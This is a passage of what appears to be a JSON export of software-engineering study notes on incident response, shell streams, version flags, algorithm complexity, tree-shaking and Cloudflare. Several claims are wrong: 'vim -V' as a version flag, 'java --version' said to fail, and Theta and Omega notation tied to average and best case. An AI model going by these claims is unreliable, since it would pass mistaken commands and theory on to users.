recurrence\n```\n\n**Key Acronyms and Terminology**\n```\nIC: Incident Commander - Leads response, makes decisions\nTL: Technical Lead - Drives technical investigation\nCL: Communications Lead - Manages stakeholder updates\nSME: Subject Matter Expert - Domain specialists (DB, network, etc.)\n\nRCA: Root Cause Analysis - Investigation into underlying cause\nRFO: Reason for Outage - Alternative term for RCA\nPIR: Post-Incident Review - Alternative term for postmortem\n\nMTTR: Mean Time to Resolution - Average time to fix incidents\nMTTD: Mean Time to Detection - Average time to detect issues\nMTTA: Mean Time to Acknowledge - Response time to alerts\nMTBF: Mean Time Between Failures - Reliability metric\n\nTTD: Time to Detect - When issue started vs when detected\nTTM: Time to Mitigate - When mitigation applied\nTTR: Time to Resolve - Total resolution time\n\nSLA: Service Level Agreement - Contractual uptime commitments\nSLO: Service Level Objective - Internal target metrics\nSLI: Service Level Indicator - Measured metrics (latency, errors)\n\nP1/P2/P3/P4: Priority levels (synonymous with SEV levels)\nRPO: Recovery Point Objective - Acceptable data loss window\nRTO: Recovery Time Objective - Acceptable downtime window\n\nEOC: Emergency Operations Center - Physical/virtual war room\nNOC: Network Operations Center - 24/7 monitoring team\n```\n\n## Common Pitfalls\n\n- Declaring incorrect severity—under-escalating SEV1 delays critical response, over-escalating SEV3 causes alert fatigue.\n- Poor communication cadence—silence creates panic, update stakeholders regularly even without progress.\n- Skipping incident commander role—multiple people making decisions creates chaos and delays.\n- Making risky fixes under pressure—\"cowboy\" changes without review can worsen outages.\n- Blame culture in postmortems—fear of punishment prevents honest analysis and learning.\n- Not documenting during incident—recreating timeline later is difficult and inaccurate.\n- Ignoring action items from postmortems—recurring incidents indicate process failure.\n\n## Practical Applications\n\n- **E-commerce:** Payment gateway down (SEV1), checkout page slow (SEV2), product images missing (SEV3).\n- **SaaS Platform:** Login unavailable (SEV1), dashboard loading slowly (SEV2), typo in UI (SEV4).\n- **Financial Services:** Trading system offline (SEV1), delayed transactions (SEV2), reporting lag (SEV3).\n- **Social Media:** Site completely down (SEV1), feed not updating (SEV2), notification delay (SEV3).\n\n**Example anecdote:** At 2am, monitoring alerts fired showing API latency spiking to 30 seconds. The on-call engineer declared SEV1, assembled the team, and started investigating. We discovered a database connection pool exhaustion from a memory leak in recent deployment. The IC coordinated a rollback while CL updated our status page every 15 minutes. We restored service in 47 minutes. The postmortem revealed we lacked proper load testing—now we load test every deployment, and haven't had a similar incident since.\n\n## References\n\n- [PagerDuty Incident Response Guide](https://response.pagerduty.com/)\n- [Atlassian Incident Management](https://www.atlassian.com/incident-management)\n- [Google SRE Book: Managing Incidents](https://sre.google/sre-book/managing-incidents/)\n- [Blameless Postmortems](https://www.blameless.com/blog/blameless-postmortems)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Severity Matrix:** Organizations define custom matrices based on impact (users affected) vs urgency (business criticality).\n- **Incident Command System (ICS):** Military-derived framework with clear chain of command and role separation.\n- **Bridge Etiquette:** Mute when not speaking, IC has final authority, technical discussions in separate threads.\n- **Customer Communications:** Balance transparency with precision—avoid promising timelines you can't meet.\n- **Escalation Paths:** Define clear escalation to engineering managers, VPs, and C-suite for prolonged SEV1s.\n- **Runbooks:** Pre-written procedures for common failure scenarios (database failover, cache invalidation, rollback procedures).\n- **Chaos Engineering:** Intentionally inject failures (Netflix's Chaos Monkey) to validate incident response capabilities.\n- **War Room Tools:** Incident.io, PagerDuty, Opsgenie, Jira Service Management for structured incident tracking.\n- **Status Page Best Practices:** Use services like Statuspage.io or Atlassian Statuspage for transparent customer communication.\n- **Blameless Culture:** Focus on systems and processes that failed, not individuals—\"what broke\" not \"who broke it.\"\n- **Action Item Tracking:** Assign owners, deadlines, and priority to postmortem action items; track completion.\n- **Incident Metrics:** Track MTTR trends, incident frequency, false positive rates to improve processes.\n- **On-Call Rotations:** Typically 1-week shifts with primary and secondary on-call engineers for coverage.\n- **Alert Fatigue:** Too many low-priority alerts desensitize teams—tune alerting thresholds carefully.\n- **Communication Templates:** Pre-written templates for status updates, customer notifications, and postmortem structure.\n- **Major Incident Reviews:** Monthly review of all SEV1/SEV2 incidents with leadership to identify patterns.\n- **Incident Taxonomy:** Categorize incidents (infrastructure, application, third-party, human error) for trend analysis.\n- **Recovery Procedures:** Automated rollback scripts, blue-green deployments, circuit breakers for fast recovery.\n- **Legal Considerations:** Document incidents carefully for regulatory compliance (SOC 2, HIPAA, GDPR breach notifications)."
    },
    {
      "id": "swe/misc/shell/stdin-stdout",
      "title": "Standard Input (stdin) and Standard Output (stdout): A Concise Overview",
      "path": [
        "swe",
        "misc",
        "shell",
        "stdin-stdout"
      ],
      "content": "---\n# Standard Input (stdin) and Standard Output (stdout): A Concise Overview\n\nStandard input (stdin) and standard output (stdout) are fundamental concepts in programming and operating systems, enabling programs to receive input and produce output in a consistent, stream-based way.\n\n## Key Points\n\n- **Streams:** stdin and stdout are streams for reading input and writing output.\n- **Default Devices:** By default, stdin reads from the keyboard, and stdout writes to the terminal.\n- **Redirection:** Input and output can be redirected to files or other programs.\n- **Language Support:** Most programming languages provide built-in support for stdin and stdout.\n- **Automation:** Enables scripting, automation, and chaining of commands.\n\n## Step-by-Step Explanation & Examples\n\n### 1. Reading from stdin (Node.js Example)\n```js\nprocess.stdin.on('data', (data) => {\n  console.log('You typed:', data.toString());\n});\n```\n\n### 2. Writing to stdout (Node.js Example)\n```js\nconsole.log('Hello, world!');\nprocess.stdout.write('This is standard output.\\n');\n```\n\n### 3. Shell Redirection Example\n```sh\nnode myscript.js < input.txt > output.txt\n```\n\n## Common Pitfalls\n\n- Forgetting to handle input encoding or end-of-line characters.\n- Not flushing output buffers (in some languages).\n- Blocking on stdin when no input is provided.\n\n## Practical Applications\n\n- Command-line utilities and scripts.\n- Data processing pipelines.\n- Interactive programs and REPLs.\n\n## References\n\n- [MDN: process.stdin (Node.js)](https://nodejs.org/api/process.html#processstdin)\n- [Wikipedia: Standard streams](https://en.wikipedia.org/wiki/Standard_streams)\n- [GNU Bash Manual: Redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Pipes:** Connect stdout of one process to stdin of another (e.g., `cat file.txt | grep hello`).\n- **File Descriptors:** stdin (0), stdout (1), and stderr (2) are represented by file descriptors in Unix-like systems.\n- **Non-blocking I/O:** Advanced programs may use non-blocking or asynchronous I/O for performance.\n"
    },
    {
      "id": "swe/misc/shell/terminal-vs-shell",
      "title": "Terminal vs Shell: A Concise Overview",
      "path": [
        "swe",
        "misc",
        "shell",
        "terminal-vs-shell"
      ],
      "content": "# Terminal vs Shell: A Concise Overview\n\nUnderstanding the distinction between a terminal and a shell is fundamental for effective command-line and development work. While often used interchangeably, they serve different roles in the software ecosystem.\n\n## Key Points\n\n- **Terminal:** A program (or device) that provides a text-based interface for user input and output.\n-\n- **Shell:** A command-line interpreter that processes commands and runs programs.\n-\n- **Relationship:** The terminal displays the shell and relays your input to it.\n- **Examples:**\n  - Terminals: Terminal.app (macOS), GNOME Terminal (Linux), Windows Terminal\n  - Shells: bash, zsh, fish, PowerShell\n- **Separation of Concerns:** You can run different shells inside the same terminal emulator.\n\n## Step-by-Step Explanation & Examples\n\n1. **Opening a Terminal**\n   - Launch Terminal.app on macOS or your preferred terminal emulator.\n2. **Shell Starts Inside Terminal**\n   - The terminal launches a shell (e.g., zsh or bash).\n3. **Typing a Command**\n   - You type `ls` and press Enter. The terminal sends this to the shell.\n4. **Shell Processes Command**\n   - The shell interprets `ls`, runs it, and sends output back to the terminal for display.\n\n## Common Pitfalls\n\n- Confusing the terminal (the interface) with the shell (the interpreter).\n- Assuming all terminals provide the same features—some are more advanced.\n- Not knowing which shell you are using, which can affect scripting and configuration.\n\n## Practical Applications\n\n- Customizing your shell for productivity (aliases, functions, prompt customization).\n- Using different shells for different scripting needs.\n- Running multiple shells in tabs or panes within a single terminal emulator.\n\n## References\n\n- [Wikipedia: Terminal Emulator](https://en.wikipedia.org/wiki/Terminal_emulator)\n- [Wikipedia: Shell (computing)](<https://en.wikipedia.org/wiki/Shell_(computing)>)\n- [GNU Bash Manual](https://www.gnu.org/software/bash/manual/bash.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **TTY and PTY:** Terminals are often implemented as pseudo-terminals (PTYs) in modern systems, emulating the behavior of physical TTY devices.\n- **Shell Scripting:** Shells provide scripting languages for automation, while terminals simply display the results.\n- **Terminal Multiplexers:** Tools like tmux or screen allow running multiple shells in one terminal window.\n  The terminal and the shell are related but distinct:\n\nTerminal:\nA terminal (or terminal emulator) is a program that provides a text-based interface to interact with your computer. It displays text, accepts keyboard input, and communicates with a shell. Examples: Terminal.app (macOS), GNOME Terminal (Linux), Windows Terminal.\n\nShell:\nA shell is a command-line interpreter that runs inside the terminal. It processes commands you type, runs programs, and manages scripts. Examples: bash, zsh, fish, PowerShell.\n\nSummary:\nThe terminal is the window/interface; the shell is the program running inside it that interprets your commands.\n"
    },
    {
      "id": "swe/misc/shell/verisons-zsh",
      "title": "Finding Software Versions in ZSH: Complete Overview",
      "path": [
        "swe",
        "misc",
        "shell",
        "verisons-zsh"
      ],
      "content": "# Finding Software Versions in ZSH: Complete Overview\n\nFinding the version of installed software is inconsistent because there's no universal standard—some tools use `--version`, others `-v`, `-V`, `version`, or other patterns. GNU tools standardized on `--version`, but many non-GNU tools use different conventions. Think of it like asking \"how old are you?\"—the answer is the same, but the phrasing depends on who made the tool.\n\n## Key Points\n\n- **GNU Standard:** `--version` (long form, double dash)\n- **BSD/Unix:** Often `-v` or `-V` (short form, single dash)\n- **No Flag:** Some tools use subcommands like `version`\n- **Try Order:** `--version` → `-v` → `-V` → `version`\n- **Fallback:** Use `--help` to find the right flag\n\n## GNU vs Non-GNU\n\n### GNU Tools (Use --version)\n\nGNU (GNU's Not Unix) established the `--version` standard for their tools.\n\n```bash\n# GNU tools consistently use --version\ngit --version       # git version 2.43.0\ngcc --version       # gcc (GCC) 13.2.0\ngrep --version      # grep (GNU grep) 3.11\nsed --version       # sed (GNU sed) 4.9\nawk --version       # GNU Awk 5.3.0\n\n# Why --version?\n# GNU Coding Standards mandate it for consistency\n```\n\n### Non-GNU Tools (Vary)\n\nBSD, proprietary, and older Unix tools use different conventions.\n\n```bash\n# BSD/Unix tools often use -v or -V\nvim -V              # VIM - Vi IMproved 9.0\nzsh -V              # zsh 5.9\nssh -V              # OpenSSH_9.0p1\ncurl -V             # curl 8.4.0 (note: uppercase)\n\n# Programming languages mix conventions\npython --version    # Python 3.12.0 (GNU-style)\nruby -v             # ruby 3.2.2 (Unix-style)\nnode --version      # v20.10.0 (GNU-style)\njava -version       # openjdk version \"21.0.1\" (single dash!)\n\n# Some use subcommands\ngo version          # go version go1.21.5\ncargo version       # cargo 1.75.0\n```\n\n## Quick Reference\n\n```bash\n# Modern tools (usually GNU-style)\nnode --version\nnpm --version\ndocker --version\nkubectl --version\nterraform --version\n\n# Unix/BSD tools (often short flags)\nvim -V\nzsh -V\nssh -V\ntmux -V\n\n# Programming languages\npython --version    # or python3 --version\nruby -v\nphp -v\ngo version          # subcommand, not flag\n\n# Databases\nmysql --version\npostgres --version\nmongod --version\n```\n\n## Universal Helper Function\n\n```bash\n# Add to ~/.zshrc\nver() {\n  local cmd=$1\n  \n  # Try common patterns\n  $cmd --version 2>&1 | head -n1 && return\n  $cmd -v 2>&1 | head -n1 && return\n  $cmd -V 2>&1 | head -n1 && return\n  $cmd version 2>&1 | head -n1 && return\n  \n  echo \"$cmd: version flag unknown. Try: $cmd --help\"\n}\n\n# Usage\nver node        # Tries --version first\nver vim         # Falls back to -V\nver go          # Falls back to version subcommand\n```\n\n## When Nothing Works\n\n```bash\n# 1. Check help\ncommand --help | grep -i version\ncommand -h\n\n# 2. Use package manager\nbrew info node              # macOS\napt-cache policy docker     # Debian/Ubuntu\nyum info nginx              # RedHat/CentOS\n\n# 3. Check location\nwhich node\n/usr/local/bin/node --version\n```\n\n## Common Gotchas\n\n```bash\n# curl uses -V (uppercase), not -v\ncurl -v         # ❌ Verbose mode\ncurl -V         # ✅ Version\n\n# java uses single dash\njava --version  # ❌ Error\njava -version   # ✅ Works\n\n# Some output to stderr\npython --version 2>&1  # Capture stderr too\n\n# Some need subcommand\ngo --version    # ❌ Error\ngo version      # ✅ Works\n```\n\n## Why The Inconsistency?\n\n```\nGNU (1980s):\n- Created --version standard\n- Double dash for long options\n- Works for: git, gcc, grep, make, etc.\n\nBSD/Unix (1970s):\n- Predates GNU, used -v or -V\n- Single dash tradition\n- Works for: vim, ssh, tmux, etc.\n\nModern Tools:\n- Usually follow GNU (--version)\n- But not always (go version, java -version)\n- No enforced standard\n```\n\n## Decision Guide\n\n```\nTry in order:\n1. --version    (GNU standard, most common)\n2. -v           (common Unix style)\n3. -V           (uppercase variant)\n4. version      (subcommand style)\n5. --help       (find the right flag)\n```\n\n## Quick Aliases\n\n```bash\n# Add to ~/.zshrc\nalias versions='echo \"Node: $(node -v)\\nGit: $(git --version)\\nPython: $(python --version 2>&1)\"'\n\n# Or check specific tool\nalias nv='node --version'\nalias pv='python --version'\nalias dv='docker --version'\n```\n\n## References\n\n- [GNU Coding Standards](https://www.gnu.org/prep/standards/html_node/Command_002dLine-Interfaces.html)\n- [POSIX Utility Conventions](https://pubs.opengroup.org/onlinepubs/9699919799/)\n\n---\n\n## Summary\n\n**No universal standard.** GNU tools use `--version`, but many tools don't follow GNU conventions.\n\n**Default strategy:** Try `--version` first (works ~70% of the time), then `-v`, `-V`, or `version`.\n\n**Make it easy:** Use the `ver()` function above to auto-detect the right flag."
    },
    {
      "id": "swe/misc/time-space-complexity/big-0-notation",
      "title": "Big O Notation: A Well-Structured Overview",
      "path": [
        "swe",
        "misc",
        "time-space-complexity",
        "big-0-notation"
      ],
      "content": "# Big O Notation: A Well-Structured Overview\n\nBig O notation is a mathematical concept used to describe the upper bound of an algorithm’s growth rate in terms of time or space complexity. It helps engineers analyze and compare the efficiency of algorithms, especially as input size increases.\n\n## Key Points\n\n- **Definition:** Big O expresses how an algorithm’s resource usage scales with input size (n).\n- **Upper Bound:** It describes the worst-case scenario for growth.\n- **Mathematical Form:** O(f(n)), where f(n) is a function representing growth (e.g., n, n^2, log n).\n- **Ignore Constants:** Big O focuses on dominant terms, ignoring constants and lower-order terms.\n- **Comparative Tool:** Used to compare algorithms regardless of hardware or implementation.\n- **Common Classes:** O(1), O(log n), O(n), O(n log n), O(n^2), O(2^n), O(n!).\n- **Applicability:** Used for both time and space complexity.\n\n## Step-by-Step Explanation & Examples\n\n1. **Mathematical Definition**\n   - If f(n) and g(n) are functions, f(n) = O(g(n)) means:\n     ```\n     There exist constants c > 0 and n₀ ≥ 0 such that for all n ≥ n₀:\n     |f(n)| ≤ c * |g(n)|\n     ```\n   - Example: f(n) = 3n + 2 is O(n) because for n ≥ 1, 3n + 2 ≤ 5n.\n\n2. **Code Example: Linear Search**\n   ```js\n   function find(arr, target) {\n     for (let i = 0; i < arr.length; i++) {\n       if (arr[i] === target) return i;\n     }\n     return -1;\n   }\n   // Time complexity: O(n)\n   ```\n\n3. **Code Example: Binary Search**\n   ```js\n   function binarySearch(arr, target) {\n     let left = 0, right = arr.length - 1;\n     while (left <= right) {\n       const mid = Math.floor((left + right) / 2);\n       if (arr[mid] === target) return mid;\n       if (arr[mid] < target) left = mid + 1;\n       else right = mid - 1;\n     }\n     return -1;\n   }\n   // Time complexity: O(log n)\n   ```\n\n## Common Pitfalls\n\n- Confusing Big O with exact runtime or average-case analysis.\n- Ignoring lower-order terms and constants in small input scenarios.\n- Misapplying Big O to non-algorithmic code (e.g., I/O operations).\n- Over-optimizing for Big O without considering practical constraints.\n\n## Practical Applications\n\n- Selecting efficient algorithms for large datasets.\n- Communicating performance expectations in code reviews and interviews.\n- Identifying bottlenecks in software systems.\n- Designing scalable systems and APIs.\n\n## References\n\n- [Big O Cheat Sheet](https://www.bigocheatsheet.com/)\n- [MIT OpenCourseWare: Asymptotic Analysis](https://ocw.mit.edu/courses/6-006-introduction-to-algorithms-fall-2011/pages/lecture-notes/)\n- [Wikipedia: Big O Notation](https://en.wikipedia.org/wiki/Big_O_notation)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Theta (Θ) and Omega (Ω) Notation:** Θ gives tight bounds (average case), Ω gives lower bounds (best case).\n- **Little o Notation:** Describes a function that grows strictly slower than another.\n- **Amortized Analysis:** Average time per operation over a sequence of operations.\n- **Non-Polynomial Time:** Algorithms with exponential or factorial time (O(2^n), O(n!)) are impractical for large inputs.\n- **Mathematical Proofs:** Use limits and inequalities to formally prove"
    },
    {
      "id": "swe/misc/time-space-complexity/space-complexity",
      "title": "Space Complexity in Algorithms: A Detailed Overview",
      "path": [
        "swe",
        "misc",
        "time-space-complexity",
        "space-complexity"
      ],
      "content": "# Space Complexity in Algorithms: A Detailed Overview\n\nSpace complexity measures the amount of memory an algorithm uses as a function of input size. It is crucial for designing efficient programs, especially in resource-constrained environments.\n\n## Key Points\n\n- **Definition:** Space complexity is the total memory required by an algorithm, including input, auxiliary, and call stack space.\n- **Big O Notation:** Expresses space growth (e.g., O(1), O(n), O(n^2)).\n- **Auxiliary Space:** Memory used by the algorithm, excluding input storage.\n- **Recursive Algorithms:** Often use extra space for the call stack.\n- **Trade-offs:** Sometimes more space is used to achieve faster runtime.\n- **Scalability:** Helps predict memory usage for large inputs.\n- **Practical Impact:** Guides algorithm and data structure selection.\n\n## Space Complexity Comparison Table\n\n| Complexity | Name        | Example Algorithm      | Growth Rate Description         |\n|------------|------------|-----------------------|---------------------------------|\n| O(1)       | Constant   | Find max in array     | No growth with input size       |\n| O(n)       | Linear     | Copy array            | Grows directly with input size  |\n| O(n^2)     | Quadratic  | Create n x n matrix   | Grows rapidly, nested structures|\n| O(log n)   | Logarithmic| Binary search (stack) | Grows slowly as input increases |\n| O(n!)      | Factorial  | Permutations          | Extremely fast growth, impractical |\n\n## Step-by-Step Explanation & Examples\n\n1. **Constant Space: O(1)**\n   ```js\n   function findMax(arr) {\n     let max = arr[0];\n     for (let i = 1; i < arr.length; i++) {\n       if (arr[i] > max) max = arr[i];\n     }\n     return max;\n   }\n   // Uses a fixed amount of space regardless of input size\n   ```\n\n2. **Linear Space: O(n)**\n   ```js\n   function copyArray(arr) {\n     let newArr = [];\n     for (let i = 0; i < arr.length; i++) {\n       newArr.push(arr[i]);\n     }\n     return newArr;\n   }\n   // Uses space proportional to input size\n   ```\n\n3. **Quadratic Space: O(n^2)**\n   ```js\n   function createMatrix(n) {\n     let matrix = [];\n     for (let i = 0; i < n; i++) {\n       matrix[i] = [];\n       for (let j = 0; j < n; j++) {\n         matrix[i][j] = 0;\n       }\n     }\n     return matrix;\n   }\n   // Uses space proportional to the square of input size\n   ```\n\n\n\n## Common Pitfalls\n\n- Ignoring auxiliary space (temporary variables, recursion stack).\n- Over-optimizing for space and sacrificing readability or speed.\n- Not considering input storage in total space complexity.\n- Underestimating memory needs for large inputs.\n\n## Practical Applications\n\n- Designing algorithms for embedded or mobile devices.\n- Optimizing data processing pipelines.\n- Interviewing and technical assessments.\n- Evaluating trade-offs in resource-constrained environments.\n\n## References\n\n- [GeeksforGeeks: Space Complexity](https://www.geeksforgeeks.org/space-complexity-analysis-algorithms/)\n- [MIT OpenCourseWare: Complexity Analysis](https://ocw.mit.edu/courses/6-006-introduction-to-algorithms-fall-2011/pages/lecture-notes/)\n- [Big O Cheat Sheet](https://www.bigocheatsheet.com/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Auxiliary vs. Total Space:** Distinguish between extra space and input storage.\n- **Recursive Space:** Analyze stack usage in recursive algorithms.\n- **In-place Algorithms:** Minimize space by modifying input directly.\n- **Memory Hierarchy:** Real-world performance can be affected by cache, paging, etc.\n- **Profiling Tools:** Use runtime profilers to measure actual memory usage in"
    },
    {
      "id": "swe/misc/time-space-complexity/time-complexity",
      "title": "Time Complexity for Algorithms: A Detailed Overview",
      "path": [
        "swe",
        "misc",
        "time-space-complexity",
        "time-complexity"
      ],
      "content": "# Time Complexity for Algorithms: A Detailed Overview\n\nTime complexity measures how the runtime of an algorithm grows as the input size increases. It is a key metric for evaluating and comparing algorithms, helping engineers choose efficient solutions for different problems.\n\n## Key Points\n\n## Time Complexity Comparison Table\n\n| Complexity | Name         | Example Algorithm     | Growth Rate Description                  |\n| ---------- | ------------ | --------------------- | ---------------------------------------- |\n| O(1)       | Constant     | Array access          | No growth with input size                |\n| O(log n)   | Logarithmic  | Binary search         | Grows slowly as input increases          |\n| O(n)       | Linear       | Linear search         | Grows directly with input size           |\n| O(n log n) | Linearithmic | Merge sort, QuickSort | Faster than quadratic, common in sorting |\n| O(n^2)     | Quadratic    | Bubble sort           | Grows rapidly, nested loops              |\n| O(2^n)     | Exponential  | Recursive Fibonacci   | Doubles with each input increase         |\n| O(n!)      | Factorial    | Traveling salesman    | Extremely fast growth, impractical       |\n\n- **Big O Notation:** Standard way to express time complexity (e.g., O(1), O(n), O(log n), O(n^2)).\n- **Growth Rate:** Indicates how quickly runtime increases with input size.\n- **Common Complexities:** Each algorithm has a typical time complexity based on its structure.\n- **Worst, Best, Average Case:** Complexity can be analyzed for different scenarios.\n- **Scalability:** Time complexity helps predict performance for large inputs.\n- **Hidden Costs:** Constants and lower-order terms can affect real-world performance.\n- **Algorithm Choice:** Guides selection of algorithms for specific use cases.\n\n## Step-by-Step Explanation & Examples\n\n### 1. Constant Time: O(1)\n\n- **Description:** Runtime does not depend on input size.\n- **Example:**\n  ```js\n  function getFirst(arr) {\n    return arr[0];\n  }\n  ```\n\n### 2. Linear Time: O(n)\n\n- **Description:** Runtime grows proportionally with input size.\n- **Example:**\n  ```js\n  function sum(arr) {\n    let total = 0;\n    for (let i = 0; i < arr.length; i++) {\n      total += arr[i];\n    }\n    return total;\n  }\n  ```\n\n### 3. Logarithmic Time: O(log n)\n\n- **Description:** Runtime grows logarithmically; input is divided in each step.\n- **Example:**\n  ```js\n  function binarySearch(arr, target) {\n    let left = 0,\n      right = arr.length - 1;\n    while (left <= right) {\n      const mid = Math.floor((left + right) / 2);\n      if (arr[mid] === target) return mid;\n      if (arr[mid] < target) left = mid + 1;\n      else right = mid - 1;\n    }\n    return -1;\n  }\n  ```\n\n### 4. Quadratic Time: O(n^2)\n\n- **Description:** Runtime grows with the square of input size; often from nested loops.\n- **Example:**\n  ```js\n  function bubbleSort(arr) {\n    for (let i = 0; i < arr.length; i++) {\n      for (let j = 0; j < arr.length - 1; j++) {\n        if (arr[j] > arr[j + 1]) {\n          [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];\n        }\n      }\n    }\n    return arr;\n  }\n  ```\n\n### 5. Linearithmic Time: O(n log n)\n\n- **Description:** Common in efficient sorting algorithms.\n- **Example:**\n  - Merge Sort, QuickSort (average case)\n\n## Common Pitfalls\n\n- Misinterpreting Big O notation (e.g., confusing O(n) with O(1)).\n- Ignoring worst-case scenarios.\n- Over-optimizing for time and neglecting other factors (space, readability).\n- Not considering hidden constants or lower-order terms.\n\n## Practical Applications\n\n- Choosing the right algorithm for large datasets.\n- Optimizing code for performance-critical systems.\n- Interviewing and technical assessments.\n- Evaluating trade-offs in resource-constrained environments.\n\n## References\n\n- [Big O Cheat Sheet](https://www.bigocheatsheet.com/)\n- [MIT OpenCourseWare: Complexity Analysis](https://ocw.mit.edu/courses/6-006-introduction-to-algorithms-fall-2011/pages/lecture-notes/)\n- [GeeksforGeeks: Time Complexity](https://www.geeksforgeeks.org/analysis-of-algorithms-set-1-asymptotic-analysis/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Amortized Analysis:** Average time per operation over a sequence of operations.\n- **Recursive Algorithms:** Analyze time complexity for recursive calls (e.g., call stack).\n- **Lower Bounds:** Some problems have proven minimum complexity (e.g., comparison sort is Ω(n log n)).\n- **Profiling Tools:** Use runtime profilers to measure actual time usage in production code.\n- **Non-Polynomial Time:** Algorithms with exponential or factorial time (O(2^n), O(n!)) are\n"
    },
    {
      "id": "swe/misc/tree-shacking",
      "title": "Tree-Shaking and `sideEffects` in Modern JavaScript Projects",
      "path": [
        "swe",
        "misc",
        "tree-shacking"
      ],
      "content": "# Tree-Shaking and `sideEffects` in Modern JavaScript Projects\n\nTree-shaking is a build optimization technique used by modern JavaScript bundlers (like Webpack, Rollup, and esbuild) to eliminate unused code from final bundles. This helps reduce bundle size and improve application performance.\n\n## What is Tree-Shaking?\n\nTree-shaking analyzes your codebase and removes exports that are never imported or used. It relies on ES module syntax (`import`/`export`) for static analysis.\n\n**Example:**\nIf a module exports multiple functions but only one is imported elsewhere, tree-shaking can remove the unused exports from the bundle.\n\n## The Role of `sideEffects`\n\nSome modules perform actions when imported, such as modifying global state, registering plugins, or polyfilling features. These are called \"side effects.\"\n\nBundlers use the `sideEffects` field in `package.json` to determine which files are safe to remove. If a file is marked as having no side effects, the bundler can safely exclude it if it's unused.\n\n**Example `package.json`:**\n```json\n{\n  \"sideEffects\": false\n}\n```\nThis tells the bundler that importing any file in the package does not cause side effects.\n\nAlternatively, you can specify files that do have side effects:\n```json\n{\n  \"sideEffects\": [\"*.css\", \"./src/setupGlobals.js\"]\n}\n```\n\n## Best Practices\n\n- Use ES modules for maximum tree-shaking benefits.\n- Explicitly declare `sideEffects` in your package to help bundlers optimize safely.\n- Avoid side effects in modules unless necessary.\n\n## References\n\n- [Webpack Tree Shaking](https://webpack.js.org/guides/tree-shaking/)\n- [Rollup Tree Shaking](https://rollupjs.org/guide/en/#tree-shaking)\n-"
    },
    {
      "id": "swe/security/web-security/cloudflare-intro",
      "title": "Cloudflare: Complete Overview",
      "path": [
        "swe",
        "security",
        "web-security",
        "cloudflare-intro"
      ],
      "content": "# Cloudflare: Complete Overview\n\nCloudflare is a global network that sits between website visitors and hosting servers, providing CDN (Content Delivery Network), DDoS protection, DNS, and security services. It speeds up websites by caching content globally and protects against attacks by filtering malicious traffic. Think of Cloudflare as a smart security guard and delivery service—it blocks bad actors, caches your content worldwide for faster access, and routes traffic efficiently.\n\n## Key Points\n\n- **CDN:** Caches content on 300+ servers worldwide for faster delivery\n- **DDoS Protection:** Blocks malicious traffic and attacks\n- **DNS:** Fast, free DNS hosting (1.1.1.1)\n- **SSL/TLS:** Free SSL certificates for HTTPS\n- **Free Tier:** Generous free plan for most websites\n\n## Core Services\n\n### 1. CDN (Content Delivery Network)\n\nCaches static content globally for faster loading.\n\n```\nWithout Cloudflare:\nUser in Tokyo → Server in New York → 200ms latency\n\nWith Cloudflare:\nUser in Tokyo → Cloudflare Tokyo data center → 20ms latency\n```\n\n**What Gets Cached:**\n```\n✅ Cached by default:\n- Images (.jpg, .png, .webp)\n- CSS files (.css)\n- JavaScript (.js)\n- Static HTML (with page rules)\n\n❌ Not cached by default:\n- HTML pages\n- API responses\n- Dynamic content\n```\n\n**Cache Control:**\n```html\n<!-- Server sets cache headers -->\nCache-Control: public, max-age=3600\n\n<!-- Cloudflare respects and extends -->\n```\n\n### 2. DDoS Protection\n\nAutomatically blocks malicious traffic.\n\n```\nAttack Types Protected:\n- Layer 3/4: Network floods (SYN, UDP)\n- Layer 7: HTTP floods, slowloris\n- Volumetric: Bandwidth exhaustion\n\nFree tier includes:\n- Unlimited DDoS mitigation\n- Rate limiting (100 rules)\n- IP blocking\n```\n\n### 3. DNS Hosting\n\nFast, reliable DNS with free tier.\n\n```bash\n# Cloudflare's public DNS\n1.1.1.1 (primary)\n1.0.0.1 (secondary)\n\n# Fastest DNS resolver globally\n# Privacy-focused (no logging)\n```\n\n**DNS Records in Cloudflare:**\n```\nType    Name              Value              Proxy Status\nA       example.com       192.0.2.1          ☁️ Proxied\nCNAME   www               example.com        ☁️ Proxied\nA       direct            192.0.2.1          🔘 DNS Only\nMX      example.com       mail.google.com    🔘 DNS Only\n\nProxied (☁️): Traffic goes through Cloudflare\nDNS Only (🔘): Direct to origin server\n```\n\n### 4. SSL/TLS\n\nFree SSL certificates for all sites.\n\n```\nSSL Modes:\n\n1. Off (not secure)\n   Browser → Cloudflare → Server\n   HTTP      HTTP         HTTP\n\n2. Flexible (⚠️ not recommended)\n   Browser → Cloudflare → Server\n   HTTPS     HTTP         HTTP\n   \n3. Full (basic security)\n   Browser → Cloudflare → Server\n   HTTPS     HTTPS        HTTPS (self-signed OK)\n\n4. Full (Strict) (✅ recommended)\n   Browser → Cloudflare → Server\n   HTTPS     HTTPS        HTTPS (valid cert required)\n```\n\n**Auto HTTPS Rewrites:**\n```html\n<!-- Your HTML -->\n<img src=\"http://example.com/image.jpg\">\n\n<!-- Cloudflare rewrites to -->\n<img src=\"https://example.com/image.jpg\">\n```\n\n## Setup Process\n\n### 1. Add Site to Cloudflare\n\n```\n1. Sign up at cloudflare.com\n2. Click \"Add a Site\"\n3. Enter domain: example.com\n4. Choose plan (Free)\n5. Cloudflare scans existing DNS records\n6. Review and confirm records\n```\n\n### 2. Update Nameservers\n\n```\nChange nameservers at domain registrar:\n\nOld (GoDaddy example):\nns1.godaddy.com\nns2.godaddy.com\n\nNew (Cloudflare):\naria.ns.cloudflare.com\ntodd.ns.cloudflare.com\n\nWait for propagation (usually <1 hour)\n```\n\n### 3. Configure Settings\n\n```\nRecommended settings:\n\nSSL/TLS:        Full (Strict)\nAlways Use HTTPS: On\nAuto Minify:    HTML, CSS, JS\nBrotli:         On\n```\n\n## Page Rules\n\nControl caching and behavior per URL.\n\n```\nFree tier: 3 page rules\n\nExample 1: Cache everything on blog\nURL: blog.example.com/*\nSettings:\n- Cache Level: Cache Everything\n- Edge Cache TTL: 1 day\n\nExample 2: Bypass cache for admin\nURL: example.com/admin/*\nSettings:\n- Cache Level: Bypass\n\nExample 3: Force HTTPS 